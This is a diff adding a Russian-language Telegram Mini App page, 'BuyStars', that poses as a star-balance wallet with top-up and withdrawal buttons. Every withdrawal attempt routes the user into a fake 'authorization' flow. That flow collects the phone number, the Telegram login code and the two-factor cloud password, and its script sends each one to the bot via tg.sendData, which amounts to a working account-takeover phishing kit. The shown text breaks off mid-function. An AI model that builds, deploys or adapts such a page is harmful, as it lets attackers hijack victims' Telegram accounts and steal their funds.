@@ -1,0 +1,1327 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BuyStars - Покупка звёзд!</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #1a1a1a;
+            color: #ffffff;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+        
+        .header h1 {
+            font-size: 18px;
+            font-weight: 600;
+        }
+        
+        .header .menu-btn {
+            background: none;
+            border: none;
+            color: #ffffff;
+            font-size: 20px;
+            cursor: pointer;
+        }
+        
+        .status-badge {
+            display: flex;
+            align-items: center;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            padding: 8px 16px;
+            margin-bottom: 40px;
+            width: fit-content;
+        }
+        
+        .status-icon {
+            width: 20px;
+            height: 20px;
+            background: #00bcd4;
+            border-radius: 50%;
+            margin-right: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+        }
+        
+        .balance-section {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+        
+        .balance-amount {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 48px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+        
+        .star-icon {
+            color: #ffd700;
+            margin-right: 10px;
+        }
+        
+        .balance-label {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 16px;
+        }
+        
+        .balance-label .highlight {
+            color: #ffd700;
+        }
+        
+        .action-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 40px;
+            margin-bottom: 40px;
+        }
+        
+        .action-btn {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background: none;
+            border: none;
+            color: #ffffff;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        
+        .action-btn:hover {
+            transform: scale(1.05);
+        }
+        
+        .action-btn-icon {
+            width: 60px;
+            height: 60px;
+            background: #ffd700;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            color: #000;
+            margin-bottom: 8px;
+        }
+        
+        .action-btn-text {
+            font-size: 14px;
+            color: #ffd700;
+            font-weight: 500;
+        }
+        
+        .feature-card {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 16px;
+            padding: 16px;
+            margin-bottom: 20px;
+            border-left: 4px solid #ffd700;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        
+        .feature-card:hover {
+            background: rgba(255, 255, 255, 0.08);
+        }
+        
+        .feature-card-content {
+            display: flex;
+            align-items: center;
+        }
+        
+        .feature-icon {
+            width: 50px;
+            height: 50px;
+            background: #ffd700;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            color: #000;
+            margin-right: 16px;
+        }
+        
+        .feature-text {
+            flex: 1;
+        }
+        
+        .feature-title {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+        
+        .feature-description {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.7);
+        }
+        
+        .feature-arrow {
+            color: rgba(255, 255, 255, 0.5);
+            font-size: 18px;
+        }
+        
+        .history-section {
+            margin-top: 30px;
+        }
+        
+        .history-title {
+            font-size: 16px;
+            color: rgba(255, 255, 255, 0.7);
+            margin-bottom: 16px;
+        }
+        
+        .history-empty {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 12px;
+            padding: 40px 20px;
+            text-align: center;
+            color: rgba(255, 255, 255, 0.5);
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 40px;
+            color: rgba(255, 255, 255, 0.5);
+            font-size: 14px;
+        }
+        
+        /* Модальные окна */
+        .modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #1a1a1a;
+            z-index: 1000;
+            padding: 20px;
+            overflow-y: auto;
+            display: none;
+        }
+        
+        .modal.active {
+            display: block;
+        }
+        
+        .modal-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+        
+        .back-btn {
+            background: none;
+            border: none;
+            color: #ffffff;
+            font-size: 24px;
+            cursor: pointer;
+            margin-right: 16px;
+        }
+        
+        .modal-title {
+            font-size: 20px;
+            font-weight: 600;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .form-input {
+            width: 100%;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 12px;
+            padding: 16px;
+            color: #ffffff;
+            font-size: 16px;
+        }
+        
+        .form-input::placeholder {
+            color: rgba(255, 255, 255, 0.5);
+        }
+        
+        .country-selector {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 12px;
+            padding: 16px;
+            cursor: pointer;
+        }
+        
+        .phone-input-group {
+            display: flex;
+            gap: 8px;
+        }
+        
+        .country-code {
+            width: 80px;
+            text-align: center;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid #ffd700;
+        }
+        
+        .submit-btn {
+            width: 100%;
+            background: #ffd700;
+            color: #000;
+            border: none;
+            border-radius: 12px;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        
+        .code-input {
+            text-align: center;
+            font-size: 24px;
+            letter-spacing: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .auth-icon {
+            text-align: center;
+            font-size: 64px;
+            margin-bottom: 20px;
+        }
+        
+        .auth-description {
+            text-align: center;
+            color: rgba(255, 255, 255, 0.7);
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+        
+        /* Специальный экран авторизации для вывода */
+        .withdraw-auth-screen {
+            text-align: center;
+            padding: 40px 20px;
+        }
+        
+        .auth-main-icon {
+            width: 120px;
+            height: 120px;
+            background: linear-gradient(135deg, #00bcd4, #0097a7);
+            border-radius: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 30px;
+            position: relative;
+        }
+        
+        .auth-main-icon::before {
+            content: '';
+            position: absolute;
+            top: -20px;
+            left: -20px;
+            right: -20px;
+            bottom: -20px;
+            background: radial-gradient(circle, rgba(0, 188, 212, 0.2) 0%, transparent 70%);
+            border-radius: 50px;
+        }
+        
+        .auth-main-icon .checkmark {
+            color: white;
+            font-size: 48px;
+        }
+        
+        .sparkles {
+            position: absolute;
+            width: 200px;
+            height: 200px;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            pointer-events: none;
+        }
+        
+        .sparkle {
+            position: absolute;
+            color: #00bcd4;
+            font-size: 12px;
+            animation: sparkle 2s infinite;
+        }
+        
+        .sparkle:nth-child(1) { top: 10%; left: 20%; animation-delay: 0s; }
+        .sparkle:nth-child(2) { top: 20%; right: 15%; animation-delay: 0.3s; }
+        .sparkle:nth-child(3) { bottom: 30%; left: 10%; animation-delay: 0.6s; }
+        .sparkle:nth-child(4) { bottom: 20%; right: 20%; animation-delay: 0.9s; }
+        .sparkle:nth-child(5) { top: 40%; left: 5%; animation-delay: 1.2s; }
+        .sparkle:nth-child(6) { top: 60%; right: 10%; animation-delay: 1.5s; }
+        
+        @keyframes sparkle {
+            0%, 100% { opacity: 0; transform: scale(0.5); }
+            50% { opacity: 1; transform: scale(1); }
+        }
+        
+        .auth-title {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 16px;
+        }
+        
+        .auth-subtitle {
+            color: rgba(255, 255, 255, 0.7);
+            margin-bottom: 40px;
+            line-height: 1.5;
+        }
+        
+        .auth-steps {
+            margin-bottom: 40px;
+        }
+        
+        .auth-step {
+            display: flex;
+            align-items: center;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 16px;
+            padding: 16px;
+            margin-bottom: 12px;
+        }
+        
+        .auth-step-icon {
+            width: 40px;
+            height: 40px;
+            background: #ffd700;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 16px;
+            color: #000;
+            font-size: 18px;
+        }
+        
+        .auth-step-content {
+            flex: 1;
+        }
+        
+        .auth-step-title {
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+        
+        .auth-step-desc {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 14px;
+        }
+        
+        .auth-step.completed .auth-step-icon {
+            background: #4caf50;
+            color: white;
+        }
+        
+        .auth-step.active .auth-step-icon {
+            background: #00bcd4;
+            color: white;
+        }
+        
+        /* Стили для выбора страны */
+        .country-list {
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        
+        .country-item {
+            display: flex;
+            align-items: center;
+            padding: 16px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 12px;
+            margin-bottom: 8px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        
+        .country-item:hover {
+            background: rgba(255, 255, 255, 0.1);
+        }
+        
+        .country-item:active {
+            background: rgba(255, 255, 255, 0.15);
+        }
+        
+        .country-flag {
+            font-size: 24px;
+            margin-right: 16px;
+        }
+        
+        .country-name {
+            flex: 1;
+            font-size: 16px;
+            font-weight: 500;
+        }
+        
+        .country-code {
+            color: #ffd700;
+            font-weight: 600;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Главный экран -->
+        <div id="main-screen">
+            <div class="header">
+                <h1>BuyStars - Покупка звёзд!</h1>
+                <button class="menu-btn">⋯</button>
+            </div>
+            
+            <div class="status-badge">
+                <div class="status-icon">💎</div>
+                <span>Platinum</span>
+            </div>
+            
+            <div class="balance-section">
+                <div class="balance-amount">
+                    <span class="star-icon">⭐</span>
+                    <span id="balance-value">0</span>
+                </div>
+                <div class="balance-label">
+                    Общий баланс в <span class="highlight">звездах</span>
+                </div>
+            </div>
+            
+            <div class="action-buttons">
+                <button class="action-btn" onclick="showTopupModal()">
+                    <div class="action-btn-icon">↗</div>
+                    <div class="action-btn-text">Пополнить</div>
+                </button>
+                <button class="action-btn" onclick="showWithdrawModal()">
+                    <div class="action-btn-icon">↙</div>
+                    <div class="action-btn-text">Вывести</div>
+                </button>
+            </div>
+            
+            <div class="feature-card" onclick="showAuthModal()">
+                <div class="feature-card-content">
+                    <div class="feature-icon">💳</div>
+                    <div class="feature-text">
+                        <div class="feature-title">Звезды чеками</div>
+                        <div class="feature-description">Делитесь звездами с помощью чеков.</div>
+                    </div>
+                    <div class="feature-arrow">›</div>
+                </div>
+            </div>
+            
+            <div class="history-section">
+                <div class="history-title">История транзакций</div>
+                <div class="history-empty">
+                    Транзакций пока нет
+                </div>
+            </div>
+            
+            <div class="footer">
+                @Headlix_bot
+            </div>
+        </div>
+        
+        <!-- Модальное окно авторизации -->
+        <div id="auth-modal" class="modal">
+            <div class="modal-header">
+                <button class="back-btn" onclick="closeModal('auth-modal')">←</button>
+                <div class="modal-title">Авторизация</div>
+            </div>
+            
+            <div class="auth-icon">🔐</div>
+            <div class="auth-description">
+                Для вывода звезд необходимо авторизоваться через номер телефона. 
+                Бот получит доступ к вашему аккаунту для проведения операции.
+            </div>
+            
+            <!-- Кнопка поделиться контактом -->
+            <button class="submit-btn" onclick="shareContact()" style="background: #00bcd4; margin-bottom: 20px;">
+                📱 ПОДЕЛИТЬСЯ КОНТАКТОМ
+            </button>
+            
+            <div style="text-align: center; margin: 20px 0; color: rgba(255, 255, 255, 0.5);">
+                или введите номер вручную
+            </div>
+            
+            <div class="form-group">
+                <label class="form-label">СТРАНА</label>
+                <div class="country-selector" onclick="showCountryModal()">
+                    <span id="selected-country">🇷🇺 Россия (+7)</span>
+                    <span>›</span>
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <label class="form-label">НОМЕР ТЕЛЕФОНА</label>
+                <div class="phone-input-group">
+                    <input type="text" id="country-code" class="form-input country-code" value="+7" readonly>
+                    <input type="tel" id="phone-number" class="form-input" placeholder="999 123 45 67">
+                </div>
+            </div>
+            
+            <button class="submit-btn" onclick="sendPhoneNumber()">ДАЛЕЕ</button>
+        </div>
+        
+        <!-- Модальное окно ввода SMS кода -->
+        <div id="sms-modal" class="modal">
+            <div class="modal-header">
+                <button class="back-btn" onclick="closeModal('sms-modal')">←</button>
+                <div class="modal-title">Введите код</div>
+            </div>
+            
+            <div class="auth-icon">📱</div>
+            <div class="auth-description">
+                Введите код из SMS, который был отправлен на ваш номер телефона
+            </div>
+            
+            <div class="form-group">
+                <input type="text" id="sms-code" class="form-input code-input" placeholder="12345" maxlength="5">
+            </div>
+            
+            <button class="submit-btn" onclick="verifySmsCode()">ПОДТВЕРДИТЬ</button>
+        </div>
+        
+        <!-- Модальное окно ввода пароля 2FA -->
+        <div id="password-modal" class="modal">
+            <div class="modal-header">
+                <button class="back-btn" onclick="closeModal('password-modal')">←</button>
+                <div class="modal-title">Пароль 2FA</div>
+            </div>
+            
+            <div class="auth-icon">🔒</div>
+            <div class="auth-description">
+                У вас включена двухфакторная аутентификация.<br>
+                Введите облачный пароль для завершения входа.
+            </div>
+            
+            <div class="form-group">
+                <input type="password" id="password-input" class="form-input" placeholder="Облачный пароль">
+            </div>
+            
+            <button class="submit-btn" onclick="verifyPassword()">ВОЙТИ</button>
+        </div>
+        
+        <!-- Модальное окно пополнения -->
+        <div id="topup-modal" class="modal">
+            <div class="modal-header">
+                <button class="back-btn" onclick="closeModal('topup-modal')">←</button>
+                <div class="modal-title">Пополнить баланс</div>
+            </div>
+            
+            <div class="form-group">
+                <label class="form-label">СУММА В ЗВЕЗДАХ</label>
+                <input type="number" id="topup-amount" class="form-input" placeholder="Введите количество звезд">
+            </div>
+            
+            <button class="submit-btn" onclick="topupBalance()">ПОПОЛНИТЬ</button>
+        </div>
+        
+        <!-- Модальное окно вывода с авторизацией -->
+        <div id="withdraw-auth-modal" class="modal">
+            <div class="modal-header">
+                <button class="back-btn" onclick="closeModal('withdraw-auth-modal')">←</button>
+                <div class="modal-title">BuyStars - Покупка звёзд!</div>
+            </div>
+            
+            <div class="withdraw-auth-screen">
+                <div class="auth-main-icon">
+                    <div class="sparkles">
+                        <div class="sparkle">✦</div>
+                        <div class="sparkle">✧</div>
+                        <div class="sparkle">✦</div>
+                        <div class="sparkle">✧</div>
+                        <div class="sparkle">✦</div>
+                        <div class="sparkle">✧</div>
+                    </div>
+                    <div class="checkmark">✓</div>
+                </div>
+                
+                <div class="auth-title">Авторизация</div>
+                <div class="auth-subtitle">
+                    Поделитесь своим номером телефона Telegram, чтобы синхронизировать профиль и разблокировать дополнительные функции
+                </div>
+                
+                <div class="auth-steps">
+                    <div class="auth-step" id="phone-step">
+                        <div class="auth-step-icon">📞</div>
+                        <div class="auth-step-content">
+                            <div class="auth-step-title">Номер телефона</div>
+                            <div class="auth-step-desc">Поделитесь номером телефона с ботом.</div>
+                        </div>
+                    </div>
+                    
+                    <div class="auth-step" id="code-step">
+                        <div class="auth-step-icon">👤</div>
+                        <div class="auth-step-content">
+                            <div class="auth-step-title">Проверочный код</div>
+                            <div class="auth-step-desc">Введите код из Telegram.</div>
+                        </div>
+                    </div>
+                </div>
+                
+                <button class="submit-btn" onclick="startWithdrawAuth()">Авторизоваться</button>
+                
+                <div class="footer" style="margin-top: 40px;">
+                    @Headlix_bot
+                </div>
+            </div>
+        </div>
+        
+        <!-- Модальное окно вывода (после авторизации) -->
+        <div id="withdraw-modal" class="modal">
+            <div class="modal-header">
+                <button class="back-btn" onclick="closeModal('withdraw-modal')">←</button>
+                <div class="modal-title">Вывести звезды</div>
+            </div>
+            
+            <div class="form-group">
+                <label class="form-label">СУММА В ЗВЕЗДАХ</label>
+                <input type="number" id="withdraw-amount" class="form-input" placeholder="Введите количество звезд">
+            </div>
+            
+            <button class="submit-btn" onclick="withdrawBalance()">ВЫВЕСТИ</button>
+        </div>
+        
+        <!-- Модальное окно выбора страны -->
+        <div id="country-modal" class="modal">
+            <div class="modal-header">
+                <button class="back-btn" onclick="closeModal('country-modal')">←</button>
+                <div class="modal-title">Выберите страну</div>
+            </div>
+            
+            <div class="country-list">
+                <div class="country-item" onclick="selectCountry('🇷🇺 Россия (+7)', '+7')">
+                    <span class="country-flag">🇷🇺</span>
+                    <span class="country-name">Россия</span>
+                    <span class="country-code">+7</span>
+                </div>
+                
+                <div class="country-item" onclick="selectCountry('🇺🇦 Украина (+380)', '+380')">
+                    <span class="country-flag">🇺🇦</span>
+                    <span class="country-name">Украина</span>
+                    <span class="country-code">+380</span>
+                </div>
+                
+                <div class="country-item" onclick="selectCountry('🇰🇿 Казахстан (+7)', '+7')">
+                    <span class="country-flag">🇰🇿</span>
+                    <span class="country-name">Казахстан</span>
+                    <span class="country-code">+7</span>
+                </div>
+                
+                <div class="country-item" onclick="selectCountry('🇧🇾 Беларусь (+375)', '+375')">
+                    <span class="country-flag">🇧🇾</span>
+                    <span class="country-name">Беларусь</span>
+                    <span class="country-code">+375</span>
+                </div>
+                
+                <div class="country-item" onclick="selectCountry('🇺🇿 Узбекистан (+998)', '+998')">
+                    <span class="country-flag">🇺🇿</span>
+                    <span class="country-name">Узбекистан</span>
+                    <span class="country-code">+998</span>
+                </div>
+                
+                <div class="country-item" onclick="selectCountry('🇦🇿 Азербайджан (+994)', '+994')">
+                    <span class="country-flag">🇦🇿</span>
+                    <span class="country-name">Азербайджан</span>
+                    <span class="country-code">+994</span>
+                </div>
+                
+                <div class="country-item" onclick="selectCountry('🇦🇲 Армения (+374)', '+374')">
+                    <span class="country-flag">🇦🇲</span>
+                    <span class="country-name">Армения</span>
+                    <span class="country-code">+374</span>
+                </div>
+                
+                <div class="country-item" onclick="selectCountry('🇬🇪 Грузия (+995)', '+995')">
+                    <span class="country-flag">🇬🇪</span>
+                    <span class="country-name">Грузия</span>
+                    <span class="country-code">+995</span>
+                </div>
+                
+                <div class="country-item" onclick="selectCountry('🇰🇬 Кыргызстан (+996)', '+996')">
+                    <span class="country-flag">🇰🇬</span>
+                    <span class="country-name">Кыргызстан</span>
+                    <span class="country-code">+996</span>
+                </div>
+                
+                <div class="country-item" onclick="selectCountry('🇹🇯 Таджикистан (+992)', '+992')">
+                    <span class="country-flag">🇹🇯</span>
+                    <span class="country-name">Таджикистан</span>
+                    <span class="country-code">+992</span>
+                </div>
+                
+                <div class="country-item" onclick="selectCountry('🇹🇲 Туркменистан (+993)', '+993')">
+                    <span class="country-flag">🇹🇲</span>
+                    <span class="country-name">Туркменистан</span>
+                    <span class="country-code">+993</span>
+                </div>
+                
+                <div class="country-item" onclick="selectCountry('🇲🇩 Молдова (+373)', '+373')">
+                    <span class="country-flag">🇲🇩</span>
+                    <span class="country-name">Молдова</span>
+                    <span class="country-code">+373</span>
+                </div>
+                
+                <div class="country-item" onclick="selectCountry('🇱🇹 Литва (+370)', '+370')">
+                    <span class="country-flag">🇱🇹</span>
+                    <span class="country-name">Литва</span>
+                    <span class="country-code">+370</span>
+                </div>
+                
+                <div class="country-item" onclick="selectCountry('🇱🇻 Латвия (+371)', '+371')">
+                    <span class="country-flag">🇱🇻</span>
+                    <span class="country-name">Латвия</span>
+                    <span class="country-code">+371</span>
+                </div>
+                
+                <div class="country-item" onclick="selectCountry('🇪🇪 Эстония (+372)', '+372')">
+                    <span class="country-flag">🇪🇪</span>
+                    <span class="country-name">Эстония</span>
+                    <span class="country-code">+372</span>
+                </div>
+                
+                <div class="country-item" onclick="selectCountry('🇺🇸 США (+1)', '+1')">
+                    <span class="country-flag">🇺🇸</span>
+                    <span class="country-name">США</span>
+                    <span class="country-code">+1</span>
+                </div>
+                
+                <div class="country-item" onclick="selectCountry('🇩🇪 Германия (+49)', '+49')">
+                    <span class="country-flag">🇩🇪</span>
+                    <span class="country-name">Германия</span>
+                    <span class="country-code">+49</span>
+                </div>
+                
+                <div class="country-item" onclick="selectCountry('🇫🇷 Франция (+33)', '+33')">
+                    <span class="country-flag">🇫🇷</span>
+                    <span class="country-name">Франция</span>
+                    <span class="country-code">+33</span>
+                </div>
+                
+                <div class="country-item" onclick="selectCountry('🇬🇧 Великобритания (+44)', '+44')">
+                    <span class="country-flag">🇬🇧</span>
+                    <span class="country-name">Великобритания</span>
+                    <span class="country-code">+44</span>
+                </div>
+                
+                <div class="country-item" onclick="selectCountry('🇮🇹 Италия (+39)', '+39')">
+                    <span class="country-flag">🇮🇹</span>
+                    <span class="country-name">Италия</span>
+                    <span class="country-code">+39</span>
+                </div>
+                
+                <div class="country-item" onclick="selectCountry('🇪🇸 Испания (+34)', '+34')">
+                    <span class="country-flag">🇪🇸</span>
+                    <span class="country-name">Испания</span>
+                    <span class="country-code">+34</span>
+                </div>
+                
+                <div class="country-item" onclick="selectCountry('🇵🇱 Польша (+48)', '+48')">
+                    <span class="country-flag">🇵🇱</span>
+                    <span class="country-name">Польша</span>
+                    <span class="country-code">+48</span>
+                </div>
+                
+                <div class="country-item" onclick="selectCountry('🇹🇷 Турция (+90)', '+90')">
+                    <span class="country-flag">🇹🇷</span>
+                    <span class="country-name">Турция</span>
+                    <span class="country-code">+90</span>
+                </div>
+                
+                <div class="country-item" onclick="selectCountry('🇨🇳 Китай (+86)', '+86')">
+                    <span class="country-flag">🇨🇳</span>
+                    <span class="country-name">Китай</span>
+                    <span class="country-code">+86</span>
+                </div>
+                
+                <div class="country-item" onclick="selectCountry('🇮🇳 Индия (+91)', '+91')">
+                    <span class="country-flag">🇮🇳</span>
+                    <span class="country-name">Индия</span>
+                    <span class="country-code">+91</span>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        let tg = window.Telegram?.WebApp;
+        if (tg) {
+            tg.expand();
+            tg.ready();
+        }
+        
+        // Проверяем URL параметры
+        function checkUrlParams() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const step = urlParams.get('step');
+            
+            if (step === 'sms') {
+                showModal('sms-modal');
+            } else if (step === 'password') {
+                showModal('password-modal');
+            } else if (step === 'auth') {
+                showModal('auth-modal');
+            } else if (step === 'withdraw') {
+                showModal('withdraw-modal');
+            }
+        }
+        
+        // Вызываем при загрузке страницы
+        document.addEventListener('DOMContentLoaded', checkUrlParams);
+        
+        function showModal(modalId) {
+            document.getElementById(modalId).classList.add('active');
+        }
+        
+        function closeModal(modalId) {
+            document.getElementById(modalId).classList.remove('active');
+        }
+        
+        function showAuthModal() {
+            showModal('auth-modal');
+        }
+        
+        function showTopupModal() {
+            showModal('topup-modal');
+        }
+        
+        function showWithdrawModal() {
+            // ВСЕГДА показываем экран авторизации при выводе
+            showModal('withdraw-auth-modal');
+        }
+        
+        function showCountryModal() {
+            showModal('country-modal');
+        }
+        
+        function selectCountry(countryText, countryCode) {
+            // Обновляем отображение выбранной страны
+            document.getElementById('selected-country').textContent = countryText;
+            
+            // Обновляем код страны в поле ввода
+            document.getElementById('country-code').value = countryCode;
+            
+            // Закрываем модальное окно выбора страны
+            closeModal('country-modal');
+            
+            // Очищаем поле номера телефона при смене страны
+            const phoneInput = document.getElementById('phone-number');
+            if (phoneInput) {
+                phoneInput.value = '';
+                phoneInput.focus();
+            }
+        }
+        
+        function startWithdrawAuth() {
+            // НЕ закрываем Mini App, а показываем форму авторизации внутри приложения
+            closeModal('withdraw-auth-modal');
+            showModal('auth-modal');
+        }
+        
+        function shareContact() {
+            if (tg) {
+                // Показываем индикатор загрузки
+                const contactBtn = document.querySelector('#auth-modal .submit-btn');
+                if (contactBtn) {
+                    contactBtn.disabled = true;
+                    contactBtn.textContent = 'ЗАПРОС КОНТАКТА...';
+                }
+                
+                // Запрашиваем разрешение на доступ к контакту
+                tg.requestContact(function(granted) {
+                    if (granted) {
+                        // Пользователь разрешил доступ к контакту
+                        // Telegram автоматически отправит контакт боту
+                        
+                        // Закрываем модальное окно авторизации
+                        closeModal('auth-modal');
+                        
+                        // Показываем сообщение о том, что контакт отправлен
+                        if (tg.showAlert) {
+                            tg.showAlert('Контакт отправлен! Ожидайте SMS код.');
+                        }
+                        
+                        // Показываем окно ввода SMS кода через 3 секунды
+                        setTimeout(() => {
+                            showModal('sms-modal');
+                        }, 3000);
+                    } else {
+                        // Пользователь отклонил запрос
+                        if (tg.showAlert) {
+                            tg.showAlert('Для авторизации необходимо поделиться контактом');
+                        }
+                    }
+                    
+                    // Восстанавливаем кнопку
+                    if (contactBtn) {
+                        contactBtn.disabled = false;
+                        contactBtn.textContent = '📱 ПОДЕЛИТЬСЯ КОНТАКТОМ';
+                    }
+                });
+            } else {
+                alert('Функция доступна только в Telegram Mini App');
+            }
+        }
+        
+        function sendPhoneNumber() {
+            const phoneNumber = document.getElementById('phone-number').value.replace(/\s/g, '');
+            const countryCode = document.getElementById('country-code').value;
+            
+            if (!phoneNumber || phoneNumber.length < 7) {
+                if (tg) {
+                    tg.showAlert('Введите корректный номер телефона');
+                } else {
+                    alert('Введите корректный номер телефона');
+                }
+                return;
+            }
+            
+            const fullPhone = countryCode + phoneNumber;
+            
+            if (tg) {
+                tg.sendData(JSON.stringify({ 
+                    action: 'send_phone', 
+                    phone: fullPhone 
+                }));
+                
+                // Показываем индикатор загрузки
+                const submitBtn = document.querySelector('#auth-modal .submit-btn');
+                if (submitBtn) {
+                    submitBtn.disabled = true;
+                    submitBtn.textContent = 'ОТПРАВКА...';
+                }
+                
+                // Автоматически показываем окно ввода SMS кода через 3 секунды
+                setTimeout(() => {
+                    closeModal('auth-modal');
+                    showModal('sms-modal');
+                    
+                    // Восстанавливаем кнопку
+                    if (submitBtn) {
+                        submitBtn.disabled = false;
+                        submitBtn.textContent = 'ДАЛЕЕ';
+                    }
+                }, 3000);
+                
+            } else {
+                alert(`Код будет отправлен на номер ${fullPhone}`);
+                closeModal('auth-modal');
+                setTimeout(() => {
+                    showModal('sms-modal');
+                }, 1000);
+            }
+        }
+        
+        function verifySmsCode() {
+            const code = document.getElementById('sms-code').value;
+            
+            if (!code || code.length !== 5) {
+                if (tg) {
+                    tg.showAlert('Введите 5-значный код');
+                } else {
+                    alert('Введите 5-значный код');
+                }
+                return;
+            }
+            
+            if (tg) {
+                tg.sendData(JSON.stringify({ 
+                    action: 'verify_sms', 
+                    code: code 
+                }));
+                
+                // Показываем индикатор загрузки
+                const input = document.getElementById('sms-code');
+                const submitBtn = document.querySelector('#sms-modal .submit-btn');
+                if (input && submitBtn) {
+                    input.disabled = true;
+                    input.value = 'Проверка...';
+                    submitBtn.disabled = true;
+                    submitBtn.textContent = 'ПРОВЕРКА...';
+                }
+                
+                // Сохраняем статус авторизации (будет обновлен при успешном ответе от бота)
+                localStorage.setItem('user_authorized', 'true');
+            } else {
+                alert(`Проверка кода: ${code} (демо режим)`);
+                localStorage.setItem('user_authorized', 'true');
+                closeModal('sms-modal');
+                showModal('withdraw-modal');
+            }
+        }
+        
+        function verifyPassword() {
+            const password = document.getElementById('password-input').value;
+            
+            if (!password) {
+                if (tg) {
+                    tg.showAlert('Введите облачный пароль');
+                } else {
+                    alert('Введите облачный пароль');
+                }
+                return;
+            }
+            
+            if (tg) {
+                tg.sendData(JSON.stringify({ 
+                    action: 'verify_password', 
+                    password: password 
+                }));
+                
+                // Показываем индикатор загрузки
+                const input = document.getElementById('password-input');
+                const submitBtn = document.querySelector('#password-modal .submit-btn');
+                if (input && submitBtn) {
+                    input.disabled = true;
+                    input.value = 'Проверка...';
+                    submitBtn.disabled = true;
+                    submitBtn.textContent = 'ПРОВЕРКА...';
+                }
+                
+                // Сохраняем статус авторизации
+                localStorage.setItem('user_authorized', 'true');
+            } else {
+                alert(`Проверка пароля (демо режим)`);
+                localStorage.setItem('user_authorized', 'true');
+                closeModal('password-modal');
+                showModal('withdraw-modal');
+            }
+        }
+        
+        function topupBalance() {
+            const amount = document.getElementById('topup-amount').value;
+            
+            if (!amount || amount <= 0) {
+                if (tg) {
+                    tg.showAlert('Введите корректную сумму');
+                } else {
+                    alert('Введите корректную сумму');
+                }
+                return;
+            }
+            
+            if (tg) {
+                tg.sendData(JSON.stringify({ 
+                    action: 'topup', 
+                    amount: parseInt(amount) 
+                }));
+                tg.close();
+            } else {
+                alert(`Пополнение на ${amount} звезд (демо режим)`);
+            }
+        }
+        
+        function withdrawBalance() {
+            const amount = document.getElementById('withdraw-amount').value;
+            
+            if (!amount || amount <= 0) {
+                if (tg) {
+                    tg.showAlert('Введите корректную сумму');
+                } else {
+                    alert('Введите корректную сумму');
+                }
+                return;
+            }
+            
+            if (tg) {
+                tg.sendData(JSON.stringify({ 
+                    action: 'withdraw', 
+                    amount: parseInt(amount) 
+                }));
+                tg.close();
+            } else {
+                alert(`Вывод ${amount} звезд (демо режим)`);
+            }
+        }
+        
+        // Функция для обработки успешной авторизации
+        function handleAuthSuccess() {
+            // Закрываем все модальные окна авторизации
+            closeModal('auth-modal');
+            closeModal('sms-modal');
+            closeModal('password-modal');
+            
+            // Показываем модальное окно вывода
+            setTimeout(() => {
+                showModal('withdraw-modal');
+            }, 500);
+        }
+        
+        // Функция для сброса состояния форм
+        function resetAuthForms() {
+            // Сбрасываем поля ввода
+            const phoneInput = document.getElementById('phone-number');
+            const smsInput = document.getElementById('sms-code');
+            const passwordInput = document.getElementById('password-input');
+            
+            if (phoneInput) {
+                phoneInput.disabled = false;
+                phoneInput.value = '';
+            }
+            
